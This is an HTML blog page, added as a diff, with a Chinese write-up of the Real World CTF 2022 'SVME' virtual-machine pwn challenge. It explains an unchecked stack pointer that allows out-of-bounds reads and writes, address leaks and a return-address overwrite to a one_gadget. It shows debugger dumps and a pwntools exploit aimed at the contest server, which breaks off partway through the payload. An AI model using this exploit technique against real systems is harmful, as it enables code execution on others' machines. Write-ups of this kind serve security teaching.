@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":230,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="开源vm+任意地址读写">
+<meta property="og:type" content="article">
+<meta property="og:title" content="rwctf2022 | SVME">
+<meta property="og:url" content="http://example.com/2022/01/26/rwctf2022/index.html">
+<meta property="og:site_name" content="71&#39;s blog">
+<meta property="og:description" content="开源vm+任意地址读写">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-01-26T02:38:36.000Z">
+<meta property="article:modified_time" content="2022-02-03T07:37:12.510Z">
+<meta property="article:author" content="7ee1n">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2022/01/26/rwctf2022/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>rwctf2022 | SVME | 71's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">71's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">宏願縱未了 奮鬥總不太晚</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/26/rwctf2022/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="7ee1n">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="71's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          rwctf2022 | SVME
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-01-26 10:38:36" itemprop="dateCreated datePublished" datetime="2022-01-26T10:38:36+08:00">2022-01-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-03 15:37:12" itemprop="dateModified" datetime="2022-02-03T15:37:12+08:00">2022-02-03</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/01/26/rwctf2022/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/01/26/rwctf2022/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote>
+<p>开源vm+任意地址读写</p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="SVME"><a href="#SVME" class="headerlink" title="SVME"></a>SVME</h1><p>程序保护全开，一次性读入code，创建了vm虚拟机后，只执行一次就free完退出了。在exec功能中可以看到程序还有打印内存、栈地址这些函数，可以利用来泄露地址。</p>
+<p>exec部分使用 jmp rax 实现分支，但是ida没有解析得很好。在 Dockerfile 中找到了原项目的地址：<a target="_blank" rel="noopener" href="https://github.com/parrt/simple-virtual-machine-C/tree/master/src">parrt/simple-virtual-machine-C</a>，从源码可以找到指令：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    NOOP    = <span class="number">0</span>,</span><br><span class="line">    IADD    = <span class="number">1</span>,   <span class="comment">// int add</span></span><br><span class="line">    ISUB    = <span class="number">2</span>,</span><br><span class="line">    IMUL    = <span class="number">3</span>,</span><br><span class="line">    ILT     = <span class="number">4</span>,   <span class="comment">// int less than</span></span><br><span class="line">    IEQ     = <span class="number">5</span>,   <span class="comment">// int equal</span></span><br><span class="line">    BR      = <span class="number">6</span>,   <span class="comment">// branch</span></span><br><span class="line">    BRT     = <span class="number">7</span>,   <span class="comment">// branch if true</span></span><br><span class="line">    BRF     = <span class="number">8</span>,   <span class="comment">// branch if false</span></span><br><span class="line">    ICONST  = <span class="number">9</span>,   <span class="comment">// push constant integer</span></span><br><span class="line">    LOAD    = <span class="number">10</span>,  <span class="comment">// load from local context</span></span><br><span class="line">    GLOAD   = <span class="number">11</span>,  <span class="comment">// load from global memory</span></span><br><span class="line">    STORE   = <span class="number">12</span>,  <span class="comment">// store in local context</span></span><br><span class="line">    GSTORE  = <span class="number">13</span>,  <span class="comment">// store in global memory</span></span><br><span class="line">    PRINT   = <span class="number">14</span>,  <span class="comment">// print stack top</span></span><br><span class="line">    POP     = <span class="number">15</span>,  <span class="comment">// throw away top of stack</span></span><br><span class="line">    CALL    = <span class="number">16</span>,  <span class="comment">// call function at address with nargs,nlocals</span></span><br><span class="line">    RET     = <span class="number">17</span>,  <span class="comment">// return value from function</span></span><br><span class="line">    HALT    = <span class="number">18</span></span><br><span class="line">&#125; VM_CODE;</span><br></pre></td></tr></table></figure>
+
+<p>该项目的结构体定义和函数功能整理如下。本题程序调用exec时，trace设置为1，因此会打印出相关的信息。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFAULT_STACK_SIZE      1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFAULT_CALL_STACK_SIZE 100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFAULT_NUM_LOCALS      10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> returnip;</span><br><span class="line">    <span class="keyword">int</span> locals[DEFAULT_NUM_LOCALS];</span><br><span class="line">&#125; Context;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> *code;</span><br><span class="line">    <span class="keyword">int</span> code_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// global variable space</span></span><br><span class="line">    <span class="keyword">int</span> *globals;</span><br><span class="line">    <span class="keyword">int</span> nglobals;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Operand stack, grows upwards</span></span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">stack</span>[DEFAULT_STACK_SIZE];</span><br><span class="line">    Context call_stack[DEFAULT_CALL_STACK_SIZE];</span><br><span class="line">&#125; VM;<span class="comment">//在vm_create中使用calloc分配空间</span></span><br><span class="line"></span><br><span class="line"><span class="function">VM *<span class="title">vm_create</span><span class="params">(<span class="keyword">int</span> *code, <span class="keyword">int</span> code_size, <span class="keyword">int</span> nglobals)</span></span>;</span><br><span class="line"><span class="comment">/*	调用vm_init(vm, code, code_size, nglobals);</span></span><br><span class="line"><span class="comment">    vm-&gt;code = code;</span></span><br><span class="line"><span class="comment">    vm-&gt;code_size = code_size;</span></span><br><span class="line"><span class="comment">    vm-&gt;globals = calloc(nglobals, sizeof(int));</span></span><br><span class="line"><span class="comment">    vm-&gt;nglobals = nglobals;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vm_free</span><span class="params">(VM *vm)</span></span>;<span class="comment">//结束程序时使用，有uaf但是用不上：free(vm-&gt;globals); free(vm);</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vm_exec</span><span class="params">(VM *vm, <span class="keyword">int</span> startip, <span class="keyword">bool</span> trace)</span></span>;</span><br><span class="line"><span class="comment">/*	用switch-case执行vm-&gt;code，直到执行完或遇到HALT(18)为止。</span></span><br><span class="line"><span class="comment">	trace==true时，会打印vm信息（应该是用于调试）。</span></span><br><span class="line"><span class="comment">	1.每次switch前调用vm_print_instr(int *code, int ip)，打印待执行指令信息（操作码+参数）</span></span><br><span class="line"><span class="comment">	2.退出循环后调用vm_print_stack(int *stack, int count)，打印结束时的vm-&gt;stack的数据</span></span><br><span class="line"><span class="comment">	3.最终调用vm_print_data(int *globals, int count)，打印结束时的vm-&gt;globals（全局数据）</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">vm_context_init</span><span class="params">(Context *ctx, <span class="keyword">int</span> ip, <span class="keyword">int</span> nlocals)</span></span>;</span><br><span class="line"><span class="comment">/*	检查参数个数nlocals是否大于DEFAULT_NUM_LOCALS（10），设置ctx-&gt;returnip = ip;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以用源码test.c中的hello来测试一下。要注意指令长度以一个int为单位（4字节）。同时本题要读齐512字节才会执行exec，因此这里以noop指令补全。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">code=p32(ICONST)+p32(<span class="number">1234</span>)+p32(PRINT)+p32(HALT)</span><br><span class="line">code=code.ljust(<span class="number">512</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">p.send(code)</span><br></pre></td></tr></table></figure>
+
+<p>输出如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0000:  iconst    1234      stack=[ 1234 ]</span><br><span class="line">0002:  print               1234</span><br><span class="line">stack=[ ]</span><br><span class="line">Data memory:</span><br></pre></td></tr></table></figure>
+
+<p>注意程序只能输入一次，不能通过接收print出来的地址计算libc地址再传回去覆盖。但是vm提供了对stack、context、globals操作的指令（pop、load、store等），可以说是任意地址读写了。还有call、ret指令，可以实现任意地址执行。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> POP: </span><br><span class="line">    --sp; <span class="comment">// 可变为负数</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> LOAD: <span class="comment">// load local or arg from local context</span></span><br><span class="line">    offset = vm-&gt;code[ip++];</span><br><span class="line">    vm-&gt;<span class="built_in">stack</span>[++sp] = vm-&gt;call_stack[callsp].locals[offset];</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> GLOAD: <span class="comment">// load from global memory</span></span><br><span class="line">    addr = vm-&gt;code[ip++];</span><br><span class="line">    vm-&gt;<span class="built_in">stack</span>[++sp] = vm-&gt;globals[addr];</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> STORE: <span class="comment">// store in local context</span></span><br><span class="line">    offset = vm-&gt;code[ip++];</span><br><span class="line">    vm-&gt;call_stack[callsp].locals[offset] = vm-&gt;<span class="built_in">stack</span>[sp--];</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> GSTORE:  <span class="comment">// store in global memory</span></span><br><span class="line">    addr = vm-&gt;code[ip++];</span><br><span class="line">    vm-&gt;globals[addr] = vm-&gt;<span class="built_in">stack</span>[sp--];</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> CALL:  <span class="comment">// call function at address with nargs,nlocals</span></span><br><span class="line">    <span class="comment">// expects all args on stack</span></span><br><span class="line">    addr = vm-&gt;code[ip++];			<span class="comment">// index of target function</span></span><br><span class="line">    <span class="keyword">int</span> nargs = vm-&gt;code[ip++]; 	<span class="comment">// how many args got pushed</span></span><br><span class="line">    <span class="keyword">int</span> nlocals = vm-&gt;code[ip++]; 	<span class="comment">// how many locals to allocate</span></span><br><span class="line">    ++callsp; <span class="comment">// bump stack pointer to reveal space for this call</span></span><br><span class="line">    vm_context_init(&amp;vm-&gt;call_stack[callsp], ip, nargs+nlocals);</span><br><span class="line">    <span class="comment">// copy args into new context</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;nargs; i++) &#123;</span><br><span class="line">    	vm-&gt;call_stack[callsp].locals[i] = vm-&gt;<span class="built_in">stack</span>[sp-i];<span class="comment">// 将存在栈上的参数存入locals</span></span><br><span class="line">    &#125;</span><br><span class="line">    sp -= nargs;</span><br><span class="line">    ip = addr;		<span class="comment">// jump to function</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> RET:</span><br><span class="line">    ip = vm-&gt;call_stack[callsp].returnip;</span><br><span class="line">    callsp--; <span class="comment">// pop context</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+
+<p>因此不需要泄露地址，我们也可以通过对内存中的地址的计算，算出system的地址然后跳转执行。从这个角度看，题目的考点应该就是构造rop链，vm提供的指令足够齐全。</p>
+<p>前面提到sp可为负数，vm的所有指令都没有对sp的合法性进行检查，因此这里可以越界读写数据。从结构体VM的定义来看，stack[0]也在heap里，在开始时可以通过pop和store指令获得stack前面的code栈地址、globals堆地址，可存到locals或globals上，这里用 GSTORE 。由于程序申请的globals数组较小，用起来不够方便，可以转用STORE存到locals上。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/8gx 0x55cacccb0290  vm heap chunk</span></span><br><span class="line">0x55cacccb0290:	0x0000000000000000	0x0000000000002101</span><br><span class="line">0x55cacccb02a0:	0x00007fff892a8490	0x0000000000000080</span><br><span class="line">0x55cacccb02b0:	0x000055cacccb23a0	0x0000000000000000</span><br><span class="line">0x55cacccb02c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/8gx 0x55cacccb2390  globals heap chunk</span></span><br><span class="line">0x55cacccb2390:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55cacccb23a0:	0x000055cacccb23a0	0x0000000000000080</span><br><span class="line">0x55cacccb23b0:	0x00007fff892a8490	0x0000000000000411</span><br></pre></td></tr></table></figure>
+
+<p>根据泄露的栈地址和栈空间，我们可以根据offset算出ret地址的位置，然后越界修改global数据的地址为这个stack地址，通过GLOAD获得程序地址。</p>
+<p>获得程序地址后，也可以通过IADD计算出got表的地址。再通过同样的修改globals地址的方式，可以用GLOAD获得libc地址。同理，再在原ret的位置修改返回地址，完成程序执行流的劫持。</p>
+<p>ret前r15和rdx都是0，因此这里可以用 one_gadget。</p>
+<p>参考：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/Valmarelox/ctf/tree/master/writeups/realworldctf-2022/SVME">Valmarelox:  ret -&gt; system(“sh”)</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/6uvvDjF6Qbxf2HU6eHBmjw">r3kapig:  freehook -&gt; system </a></li>
+</ul>
+<p>完整exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,binary = <span class="string">&quot;./svme&quot;</span>)</span><br><span class="line"><span class="comment"># p=process(&#x27;./svme&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&quot;47.243.140.252&quot;</span>, <span class="number">1337</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./svme&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> s: p.recvuntil(s)</span><br><span class="line">rv = <span class="keyword">lambda</span> s: p.recv(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y : p.sendlineafter(x,y)</span><br><span class="line">sl = <span class="keyword">lambda</span> s: p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s: p.send(s)</span><br><span class="line">it = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line">NOOP    = <span class="number">0</span></span><br><span class="line">IADD    = <span class="number">1</span><span class="comment">#	int add</span></span><br><span class="line">ISUB    = <span class="number">2</span><span class="comment">#	int sub</span></span><br><span class="line">IMUL    = <span class="number">3</span><span class="comment">#	int mul</span></span><br><span class="line">ILT     = <span class="number">4</span><span class="comment">#	int less than</span></span><br><span class="line">IEQ     = <span class="number">5</span><span class="comment">#	int equal</span></span><br><span class="line">BR      = <span class="number">6</span><span class="comment">#	branch</span></span><br><span class="line">BRT     = <span class="number">7</span><span class="comment">#	branch if true</span></span><br><span class="line">BRF     = <span class="number">8</span><span class="comment">#	branch if true</span></span><br><span class="line">ICONST  = <span class="number">9</span><span class="comment">#	push constant integer</span></span><br><span class="line">LOAD    = <span class="number">10</span><span class="comment">#	load from local context</span></span><br><span class="line">GLOAD   = <span class="number">11</span><span class="comment">#	load from global memory</span></span><br><span class="line">STORE   = <span class="number">12</span><span class="comment">#	store in local context</span></span><br><span class="line">GSTORE  = <span class="number">13</span><span class="comment">#	store in global memory</span></span><br><span class="line">PRINT   = <span class="number">14</span><span class="comment">#	print stack top</span></span><br><span class="line">POP     = <span class="number">15</span><span class="comment">#	throw away top of stack</span></span><br><span class="line">CALL    = <span class="number">16</span><span class="comment">#	call function at address with nargs,nlocals</span></span><br><span class="line">RET     = <span class="number">17</span><span class="comment">#	return value from function</span></span><br><span class="line">HALT    = <span class="number">18</span></span><br><span class="line"></span><br><span class="line">globals_low=<span class="number">1</span></span><br><span class="line">globals_high=<span class="number">2</span></span><br><span class="line">code_len_low=<span class="number">3</span></span><br><span class="line">code_len_high=<span class="number">4</span></span><br><span class="line">code_addr_low=<span class="number">5</span></span><br><span class="line">code_addr_high=<span class="number">6</span></span><br><span class="line">ret_addr_low=<span class="number">7</span></span><br><span class="line">read_addr_low=<span class="number">8</span></span><br><span class="line">elf_addr_high=<span class="number">9</span></span><br><span class="line">og_low=<span class="number">10</span></span><br><span class="line">og_high=<span class="number">11</span></span><br><span class="line"></span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_addr=libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">one_gadget=[<span class="number">0xe6c7e</span>,<span class="number">0xe6c81</span>,<span class="number">0xe6c84</span>]</span><br><span class="line">main_ret=<span class="number">0x1d5d</span> <span class="comment"># (main+226) ◂— mov    rax, qword ptr [rbp - 0x218]</span></span><br><span class="line"></span><br><span class="line">code=p32(POP)</span><br><span class="line">code+=p32(STORE)+p32(globals_high)</span><br><span class="line">code+=p32(STORE)+p32(globals_low)</span><br><span class="line">code+=p32(STORE)+p32(code_len_high)</span><br><span class="line">code+=p32(STORE)+p32(code_len_low)</span><br><span class="line">code+=p32(STORE)+p32(code_addr_high)</span><br><span class="line">code+=p32(STORE)+p32(code_addr_low)</span><br><span class="line"></span><br><span class="line">code+=p32(LOAD)+p32(code_addr_low)</span><br><span 